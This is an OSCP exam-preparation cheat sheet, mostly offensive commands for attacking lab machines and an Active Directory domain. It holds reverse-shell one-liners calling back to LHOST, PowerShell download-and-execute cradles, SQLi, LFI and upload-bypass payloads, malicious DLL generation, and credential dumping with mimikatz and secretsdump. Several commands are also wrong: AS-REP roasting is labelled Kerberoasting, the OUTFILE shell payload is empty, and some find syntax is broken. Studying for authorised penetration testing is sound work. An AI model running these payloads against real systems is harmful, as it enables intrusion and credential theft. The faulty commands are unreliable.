# OSCP Exam Mindset
## Attack Flows, Tools & Methodology

**Version:** 1.0 | **Last Updated:** January 2026 | **Purpose:** Structured exam preparation guide

---

## Table of Contents

1. [Exam Structure Overview](#exam-structure-overview)
2. [Initial Enumeration Methodology](#initial-enumeration-methodology)
3. [Port-Specific Attack Flows](#port-specific-attack-flows)
4. [Gaining Initial Access](#gaining-initial-access)
5. [Windows Privilege Escalation](#windows-privilege-escalation)
6. [Linux Privilege Escalation](#linux-privilege-escalation)
7. [Active Directory Exploitation](#active-directory-exploitation)
8. [Password Cracking](#password-cracking)
9. [Exam Documentation & Mindset](#exam-documentation--mindset)
10. [Quick Reference](#quick-reference)

---

## Exam Structure Overview

The OSCP exam consists of three standalone machines and one multi-machine Active Directory environment. Success requires methodical enumeration, understanding attack chains, and documented decision-making.

| Machine Type | Count | Key Focus |
|---|---|---|
| Standalone Machines | 3 | Initial access, privilege escalation, documentation |
| AD Environment | 1 complete domain | Lateral movement, trust exploitation, privilege escalation |

---

## Initial Enumeration Methodology

### Golden Rule

- Enumerate EVERYTHING before jumping to exploitation
- Document all findings with timestamps and rationale
- High-access ports first: RDP, SSH, WinRM, Databases

### Port Scanning Phase

| Command | Purpose |
|---|---|
| `autorecon <ip>` | Complete TCP/UDP scan with service detection (best tool) |
| `nmap -sC -sV -A -T4 -Pn -o output.nmap <ip>` | Comprehensive aggressive scan with scripts |
| `nmap -sC -A -p<port> <ip>` | Deep dive on specific port |
| `nmap -sU -p161 --script snmp* <ip>` | UDP enumeration (SNMP on 161) |

### Version Checking (Critical Step)

- Always search for version exploits: e.g., `vsftpd 3.0.2`
- Use SearchSploit and Google for POCs

---

## Port-Specific Attack Flows

### Port 21 - FTP

**Initial Access Vector:**

- Check anonymous login (user: `anonymous`, pass: `anonymous`)
- Use passive mode if `ls` fails: `type passive`
- Download files: `mget *`
- Check file metadata: `exiftool -u -a <file>`
- Upload shell: `put shell.php`
- FTP 3.0+ typically not exploitable

**Tools:**
```bash
nmap --script=ftp-* -p 21 $ip
ftp anonymous@ip
```

---

### Port 22 - SSH

**Enumeration Only (Initial Access via Other Ports)**

- Attempt credentials from other sources
- Look for SSH keys via LFI: `../../../../home/user/.ssh/id_rsa`
- Login: `ssh -i id_rsa -p 2222 user@ip`
- Check `~/.ssh/authorized_keys` for additional access

---

### Port 25, 465 - Email/SMTP

**User Enumeration & Phishing**

- Enumerate users: `nmap --script=smtp* -p 25 <ip>`
- Telnet login: `telnet <ip> 25`
- Check for open relay (can send phishing emails)

---

### Port 53 - DNS

**Domain & Subdomain Discovery**

- Zone transfer: `dig @<ip> <domain> axfr`
- Reverse lookup: `nslookup <ip>`
- Enumerate subdomains: `dnsenum <domain>`

---

### Port 80, 443, 8000, 8080 - HTTP/HTTPS

**Web Application Reconnaissance**

- Scan with: `nmap -sC -sV -A -p 80,443,8080 <ip>`
- Content discovery: `gobuster dir -u http://<ip> -w /path/wordlist`
- Screenshot homepage for visual clues
- Check source code, `robots.txt`, `sitemap.xml`
- Look for CMS (WordPress, Joomla, Drupal, etc.)

#### Web Vulnerability Checklist

| Vulnerability | Exploitation Method |
|---|---|
| SQL Injection | Manual testing → SQLMap → Command execution |
| LFI/RFI | `../../../../etc/passwd` → SSH keys → RCE |
| File Upload | Change MIME type → Add shell payload |
| RCE | Execute reverse shell |
| CMS Exploit | Check version → Google exploit → WPScan/droopescan |

#### CMS-Specific Tools

| CMS | Enumeration Command |
|---|---|
| WordPress | `wpscan --url http://target --enumerate u` |
| Drupal | `droopescan scan drupal -u http://target -t 32` |
| Joomla | Check `/administrator` → `configuration.php` |
| Elastix | Check `/vtigercrm/` default `admin:admin` |

---

### Port 139, 445 - SMB/NetBIOS

**Share Enumeration & Guest Access**

- Enumerate shares: `enum4linux -a <ip>` (best tool)
- Check public shares: `smbmap -H <ip>`
- List specific folder: `smbmap -H <ip> -R directory`
- Connect with creds: `smbclient //ip/share -U user -p password`
- Check for write access (W) → upload shell
- Scan for vulnerabilities: `nmap -script smb-vuln* -p 139,445 <ip>`

**Commands:**
```bash
nmap -v -script smb-vuln* -p 139,445 10.10.10.10
enum4linux -a 192.168.10.10
smbmap -H 192.168.10.10 -R tmp
smbclient -p 4455 //192.168.10.10/scripts -U noman --password noman1234
```

---

### Port 3389 - RDP

**Remote Desktop Access**

- Brute force (if credentials not found): `hydra -t 4 -l admin -P rockyou.txt rdp://<ip>`
- Login with credentials: `xfreerdp /v:<ip> /u:admin /p:password /workarea /smart-sizing`
- Alternative: `rdesktop <ip>`

---

### Port 3306 - MySQL

| Task | Command |
|---|---|
| Enumerate | `nmap -sV -p 3306 --script=mysql* <ip>` |
| Login | `mysql -u root -p'password' -h <ip> -P 3306` |
| Show databases | `show databases;` |
| List users | `SELECT user FROM mysql.user;` |
| Execute command | Use UDF or file write to get RCE |

---

### Port 1433 - MSSQL

| Task | Command |
|---|---|
| Enumerate | `nmap -sV -p 1433 --script ms-sql-info <ip>` |
| Login | `impacket-mssqlclient user:pass@<ip>` |
| Windows auth | `impacket-mssqlclient admin:'pass'@<ip> -windows-auth` |
| List databases | `SELECT name FROM sys.databases;` |
| Enable xp_cmdshell | `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` |
| Execute command | `exec xp_cmdshell 'whoami';` |

---

### Port 5432 - PostgreSQL

**Database Enumeration**

- Connect: `psql -U postgres -p 5432 -h <ip>`
- List databases: `SELECT datname FROM pg_database;`
- Read files: `SELECT pg_ls_dir('/etc/');`
- RCE (if enabled): `COPY (SELECT command output) TO '/tmp/file';`

---

### Port 161 UDP - SNMP

**Network Enumeration**

- Scan: `nmap -sU -p 161 --script snmp* <ip>`
- Walk OID tree: `snmpwalk -v 1 -c public <ip>`
- Often returns: usernames, passwords, system info
- Login with credentials found: `evil-winrm -i <ip> -u user -p pass`

---

## Gaining Initial Access

### Attack Priority Order

1. Default credentials (check service documentation)
2. Known version exploits (SearchSploit → POC)
3. Web vulnerabilities (SQLi, LFI, file upload, RCE)
4. Credential brute force (Hydra)

### SQL Injection Attack Flow

**SQLi to RCE:**

- Test basic: `admin'#` or `a' or 1=1#`
- Use UNION SELECT: `' UNION SELECT null,null,username,password FROM users--`
- MySQL to file: `' UNION SELECT '' INTO OUTFILE '/path/shell.php'--`
- MSSQL xp_cmdshell: `execute sp_configure 'xp_cmdshell', 1;`
- Database → Code execution → Reverse shell

**Tools:**
```bash
sqlmap -u "http://target/login" --data="user=admin&pass=admin" -p pass
sqlmap -u "http://target/login" --data="user=admin&pass=admin" -p pass --os-shell
```

---

### File Upload Attack Flow

**Bypass & Exploit:**

- Test direct upload of `.php` shell
- If blocked: change MIME type (`image/jpeg`)
- Add image header: `GIF89a` or JPEG magic bytes
- Use polyglot: add shell code to EXIF metadata
- Try extensions: `.php3`, `.php5`, `.phtml`, `.php.jpg`
- Access shell: `/uploads/shell.php?cmd=id`

**Example:**
```bash
exiftool "-comment<=shell.php" image.png
# Rename to image.php.png or bypass extension filters
```

---

### LFI to RCE Attack Flow

**Path Traversal Exploitation:**

- Test LFI: `../../../../etc/passwd`
- Extract SSH keys: `../../../../home/user/.ssh/id_rsa`
- Encode if needed: URL encode (`../` = `%2e%2e%2f`)
- Use private key: `ssh -i id_rsa user@ip`
- Alternative: Include log files to execute code via log poisoning

**Example:**
```bash
curl "http://target/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa"
# Save and use: chmod 600 id_rsa && ssh -i id_rsa user@target
```

---

### Reverse Shell Execution

**Always use:** https://www.revshells.com/ or https://pentestmonkey.net/

| Shell Type | Payload (Example) |
|---|---|
| Bash | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| Python | `python -c 'import socket...'` or `python3 -c...` |
| PowerShell | `powershell -c 'IEX(New-Object Net.WebClient).DownloadString(...)'` |
| nc | `nc LHOST LPORT -e /bin/bash` |
| URL encoded | https://www.revshells.com/ (use this tool!) |

---

## Windows Privilege Escalation

### Enumeration Priority

**Structured Enumeration Approach:**

- `whoami /all` (check if SeImpersonate or SeDebug enabled)
- Run `PowerUp.ps1` (find unquoted paths, service issues, file permissions)
- Run `WinPEAS` (finds plaintext passwords, services, scheduled tasks)
- Manual check: Windows logs, documents, executables, PDFs, registry

### Automated Tools

#### PowerUp.ps1

**Download & Execute:**

```powershell
certutil.exe -urlcache -split -f http://LHOST/PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

#### WinPEAS.exe

**Download & Execute:**

```powershell
certutil.exe -urlcache -split -f http://LHOST:8080/winPEASx64.exe
.\winPEASx64.exe
```

- Finds plaintext passwords (critical!)
- Reports services, scheduled tasks, registry misconfigurations

### SeImpersonate Privilege (Token Impersonation)

**PrintSpoofer Exploitation:**

```powershell
whoami /priv  # if SeImpersonate enabled
curl LHOST/PrintSpoofer64.exe -o pr.exe
.\pr.exe -i -c cmd
# Now running as SYSTEM
```

**GodPotato Alternative:**

```powershell
curl LHOST:8081/GodPotato-NET2.exe -o god.exe
.\god.exe -cmd "cmd /c whoami"
.\god.exe -cmd "cmd /c nc.exe LHOST LPORT -e powershell"
```

### Plaintext Password Hunting

**Critical Locations:**

- `C:\` drive root files
- Documents folder
- PowerShell history: `Get-History` or `(Get-PSReadlineOption).HistorySavePath`
- Registry (VNC): `reg query 'HKLM\SOFTWARE\RealVNC'` (stores passwords)
- Unattended.xml: `dir /s unattended.xml sysprep.inf 2>nul`
- Config files: `find C:\ -name *.ini -o *.txt`

**Commands:**
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue | type
Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse
Get-History
```

### Service Misconfigurations

#### Unquoted Service Path

**Exploitation:**

```powershell
Get-UnquotedService  # PowerUp
icacls 'C:\Program Files\service'  # Check permissions
# If writable: upload msfvenom shell to C:\Program Files\Service Name.exe
net start service  # triggers binary execution
```

#### DLL Hijacking

**Exploitation:**

```powershell
# Find service that loads DLL from writable path
msfvenom -p windows/shell_reverse_tcp -f dll -o evil.dll
# Place in path where service looks for DLL
net start service  # loads malicious DLL as SYSTEM
```

#### Scheduled Task Exploitation

**Exploitation:**

```powershell
schtasks /query /fo LIST /v  # find scheduled tasks
icacls path/to/task.exe  # Check file permissions
# If writable: replace with reverse shell
# Wait for task execution or trigger manually
```

### Kernel Exploits

**Strategy:**

- `systeminfo | findstr OS` (get Windows version)
- Run: `wmic qfe list` (show patches)
- Google: `'Windows <version> EOP exploit'`
- Use ExploitDB or SearchSploit to find POC
- Compile & execute, catch reverse shell as SYSTEM

---

## Linux Privilege Escalation

### Get Full TTY First

```bash
python3 -c 'import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])'
```

### Enumeration Methodology

1. Run `LinPEAS.sh` (automated tool)
2. Check sudo privileges
3. Look for SUID binaries
4. Check capabilities
5. Examine cron jobs
6. Search for plaintext passwords

### Automated Enumeration

**LinPEAS Setup:**

```bash
python -m http.server 80  # on attacker machine
wget http://LHOST/linpeas.sh -o linpeas.sh  # on target
chmod +x linpeas.sh && ./linpeas.sh  # execute
./linpeas.sh | tee output.txt  # save output
```

### sudo Privilege Abuse

**Exploitation:**

```bash
sudo -l  # list allowed commands
# Check GTFOBins.github.io for command abuse
# Example: sudo vim → :!/bin/bash
```

### SUID Binaries

**Discovery & Exploitation:**

```bash
find / -perm -u=s -type f 2>/dev/null  # find SUID binaries
strings binary  # look for calls to system functions
# Check GTFOBins for exploitation methods
```

### Linux Capabilities

**Exploitation:**

```bash
getcap -r / 2>/dev/null  # find capabilities
# Look for: cap_setuid+ep (can change UID)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Cron Job Exploitation

**Wildcard Attacks:**

```bash
cat /etc/crontab  # find scheduled tasks
grep CRON /var/log/syslog  # check logs
# If job uses: tar cf archive.tar * (wildcard vulnerable)
# Create: --checkpoint=1 --checkpoint-action=exec=/bin/bash
# When cron runs tar, executes our command as root
```

### Plaintext Password Hunting

**Common Locations:**

```bash
cat .bashrc .bash_history  # shell history
find / -name '*.txt' -o '*.log' 2>/dev/null  # config files
grep -r 'password' /home/ 2>/dev/null
# Check backup files: *.bak, *.old, *.backup
# Database configs: /etc/mysql/, /etc/postgres/
```

### Kernel Exploits

**Strategy:**

```bash
uname -a  # get kernel version
# Google: 'Linux <kernel> EOP exploit'
# SearchSploit for POC code
gcc -o exploit exploit.c && ./exploit
```

---

## Active Directory Exploitation

AD exam consists of: **Machine01** (standalone), **Machine02** (domain member), **Domain01** (domain controller). Must chain privilege escalation → lateral movement → domain compromise.

### Phase 1: Machine01 Enumeration

**Local Enumeration:**

```powershell
net user /domain
net group /domain
whoami /all
ipconfig /all
```

**Privilege Escalation:**

- Use `PowerUp.ps1`, `WinPEAS`, token impersonation
- Goal: Get SYSTEM or Administrator access

### Phase 2: Domain Enumeration (BloodHound)

**SharpHound Collection:**

```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
# Transfer bloodhound.zip back to attacker machine
# Analyze in BloodHound GUI for attack paths
```

### Phase 3: Credential Harvesting

#### Secretsdump

**Dump Domain Credentials:**

```bash
python3 ./secretsdump.py ./administrator:'Password123'@192.168.10.10
```

- Extracts: NTLM hashes, Kerberos keys
- Provides all domain user hashes (for Pass-The-Hash)
- Look for plaintext passwords in sam dump

#### Mimikatz

**Extract Credentials from Memory:**

```powershell
privilege::debug
token::elevate
sekurlsa::logonpasswords  # dump plaintext passwords
lsadump::sam  # dump local SAM hashes
```

### Phase 4: Lateral Movement to Machine02

#### Port Forwarding Setup

**Option A: SSH SOCKS Proxy**

```bash
ssh -D 8001 -C -q -N user@Machine01IP
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 8001
proxychains nmap -sT -p 22,445,88 Machine02IP
```

**Option B: Chisel Reverse Proxy**

```bash
./chisel server -p 5555 --reverse  # attacker
certutil -urlcache -split -f http://AttackerIP/chisel-x64.exe  # Machine01
chisel client AttackerIP:5555 R:socks  # Machine01
proxychains python3 impacket-GetNPUsers  # attacker
```

#### Kerberoasting (Machine02)

**Windows-side with Rubeus:**

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
# Transfer hashes to attacker
```

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

**Linux-side with GetUserSPNs.py:**

```bash
proxychains python3 impacket-GetNPUsers oscp.exam/ -dc-ip Machine02IP
hashcat -m 18200 hashes.txt rockyou.txt
```

#### Exploitation on Machine02

**Post-Exploitation:**

```bash
# If SQL:
proxychains impacket-mssqlclient user:pass@ip

# If SMB/WinRM:
psexec.py domain/user:pass@ip
evil-winrm -i ip -u admin -p password
```

Goal: Get shell as domain user or SYSTEM

### Phase 5: Domain Controller Compromise

**Final Exploitation:**

```bash
psexec.py domain/user:pass@DCip  # get admin shell
evil-winrm -i DCip -u admin -p pass
secretsdump.py domain/user:pass@DCip  # dump entire domain DB (ntds.dit)
```

---

## Password Cracking

### Hash Identification

| Tool | Command |
|---|---|
| hash-identifier | `hash-identifier` (interactive, for simple hashes) |
| hashid | `hashid '$2y$10$...'` (for bcrypt, scrypt, etc.) |
| Name-that-hash | `nth -t '$2y$10$...'` (comprehensive online tool) |

### John the Ripper

| Hash Type | Command |
|---|---|
| MD5 | `john hash.txt --format=md5crypt` |
| SSH Key | `ssh2john id_rsa > ssh.hash && john ssh.hash` |
| ZIP | `zip2john file.zip > zip.hash && john zip.hash` |
| Zip direct | `fcrackzip -u -D -p rockyou.txt file.zip` |

### Hashcat

| Hash Mode | Command |
|---|---|
| NTLM (1000) | `hashcat -m 1000 hash.txt rockyou.txt` |
| Kerberoast (13100) | `hashcat -m 13100 hashes.txt rockyou.txt` |
| ASREP (18200) | `hashcat -m 18200 hashes.txt rockyou.txt` |
| With rules | `hashcat -m 1000 hash.txt rockyou.txt -r best64.rule` |
| Show mode numbers | `hashcat --help \| grep -i 'ntlm'` |

### Hydra Brute Force

| Service | Command |
|---|---|
| SSH | `hydra -l user -P rockyou.txt -s 2222 ssh://192.168.10.10` |
| HTTP POST | `hydra -l user -P rockyou.txt 192.168.10.10 http-post` |
| Custom form | `hydra -l user -P rockyou.txt 192.168.10.10 http-post-form '/index.php:user=^USER^&pass=^PASS^:Invalid'` |
| RDP | `hydra -t 4 -l admin -P rockyou.txt rdp://192.168.10.10` |

### Wordlist Customization

**Tailor rockyou.txt:**

```bash
head -1000 rockyou.txt > demo.txt  # Extract top N passwords
sed -i '/^1/d' demo.txt  # Remove passwords starting with 1
echo '$1' > demo.rule  # Add prefix/suffix
hashcat -r demo.rule --stdout demo.txt
```

---

## Exam Documentation & Mindset

### Critical Documentation Checklist

- ✓ Screenshot of shell access with machine name visible
- ✓ "whoami" output showing SYSTEM/root privilege
- ✓ Path to root.txt or flag file
- ✓ Write-up explaining METHODOLOGY (not just commands)
- ✓ Screenshots of key enumeration findings

### Exam Time Management

| Phase | Suggested Time |
|---|---|
| Recon (all 4 machines) | 4-5 hours |
| Initial Access (per machine) | 1-2 hours |
| Privilege Escalation | 2-3 hours |
| Documentation | 3-4 hours |
| Buffer/troubleshooting | 3+ hours |

### When Stuck

1. Restart enumeration from scratch (missed port? Missed service?)
2. Google service name + version + exploit
3. Check GTFOBins (Linux) or LOLBins (Windows) for privilege escalation
4. Look for plaintext passwords in files/memory
5. Try different machines (AD attack path might be clearer)

### Key Mindset Reminders

- **Enumeration > Exploitation.** Slow down, be thorough.
- **Understand WHY** each attack works, not just HOW to run it.
- **Document decision-making:** Why did you try X? What did you find?
- **High-value targets first:** If you can see RDP/SSH/SQL, try those first.
- **Default credentials work** more often than you think.

---

## Quick Reference

### File Transfer

```bash
# Linux to Windows
certutil.exe -urlcache -split -f http://LHOST/file.exe
iwr -uri http://LHOST/file.ps1 -Outfile file.ps1
curl http://LHOST/file -o file

# Attacker HTTP server
python3 -m http.server 80
```

### Reverse Shell (Use revshells.com)

```bash
# Bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PowerShell
powershell -c 'IEX(New-Object Net.WebClient).DownloadString("http://LHOST/shell.ps1")'
```

### Listener Setup

```bash
# Netcat
nc -lvnp LPORT

# Metasploit
use exploit/multi/handler
set PAYLOAD windows/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT LPORT
exploit -j
```

### Windows Privilege Escalation Commands

```powershell
whoami /all
systeminfo | findstr /B OS
wmic qfe list
net user /domain
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

### Linux Privilege Escalation Commands

```bash
python3 -c 'import pty; pty.spawn(["/bin/bash", "--rcfile", "/etc/bash.bashrc"])'
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
./linpeas.sh
```

### Active Directory Commands

```bash
net user /domain
proxychains python3 impacket-GetNPUsers oscp.exam/ -dc-ip IP
secretsdump.py domain/user:pass@IP
psexec.py domain/user:pass@IP
evil-winrm -i IP -u admin -p password
```

---

## Additional Resources

### Tools & Websites
- **Reverse Shells:** https://www.revshells.com/ | https://pentestmonkey.net/
- **GTFOBins:** https://gtfobins.github.io/
- **LOLBins (Windows):** https://lolbas-project.github.io/
- **SearchSploit:** `searchsploit <service>`
- **ExploitDB:** https://www.exploitdb.com/

### Common Password Lists
- **rockyou.txt:** `/usr/share/wordlists/rockyou.txt`
- **SecLists:** https://github.com/danielmiessler/SecLists

### Useful Commands Reference
- **Extract wordlist from text:** `cat file.txt | grep -oE '\w+' | sort -u > wordlist.txt`
- **Start simple HTTP server:** `python3 -m http.server 80`
- **Start SMB server:** `impacket-smbserver share /tmp`

---

**Last Updated:** January 2026  
**Status:** Active use during OSCP exam preparation  

